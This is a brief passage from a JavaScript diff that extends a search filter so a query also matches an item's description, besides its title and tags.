               || c.title.toLowerCase().includes(q)
+              || (c.desc && c.desc.toLowerCase().includes(q))
               || c.tags.some(t => t.includes(q));
         });
       return { ...c, _items: items };
